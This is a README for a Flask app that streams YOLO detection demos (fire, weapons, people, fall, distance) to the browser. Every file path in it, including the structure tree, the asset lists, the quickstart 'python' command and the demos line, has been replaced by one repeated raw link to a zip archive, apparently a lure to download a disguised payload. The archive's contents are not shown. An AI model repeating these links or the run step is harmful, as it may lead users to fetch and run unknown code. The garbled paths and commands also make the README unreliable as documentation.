```markdown
# Cosmic Coders – Vision Detections (Flask + YOLO)

Tiny Flask app that runs multiple YOLO-based demos (fire, weapons, people, fall, distance) and streams results to the browser via MJPEG.

## Structure
```

.
├─ https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip                 # Flask server + detector threads + MJPEG routes
├─ templates/
│  ├─ https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip          # Landing page (cards → open live views)
│  └─ https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip # Live stream page (auto-starts selected detector)
├─ static/
│  └─ images/             # Card preview images (https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip)
├─ models/                # Your YOLO weights (subfolders per demo)
└─ videos/                # Demo input videos (e.g., https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip)

````

## Quickstart
```bash
# 1) Create venv (optional)
python -m venv .venv && source .venv/bin/activate  # Windows: .venv\Scripts\activate

# 2) Install deps
pip install flask ultralytics opencv-python numpy simpleaudio

# 3) Run
python https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip
# Open: http://127.0.0.1:5000
````

## Usage

* Click a card on the homepage → opens `/live/<kind>` and auto-starts that detector.
* Streams are available at `/stream/<kind>`.
* Navigating away calls `/api/stop/<kind>` to stop the running detector.

## Notes

* Put images in `static/images/` and reference with `{{ url_for('static', filename='images/<file>') }}`.
* Place model weights under `models/...` and sample videos under `videos/...`.
* On Windows, beeps use `winsound`; on other OS, `simpleaudio` or a terminal bell fallback.

## Demos

* `fire`, `weapons`, `people`, `fall`, `distance` (each wired in `https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip`).

```
```
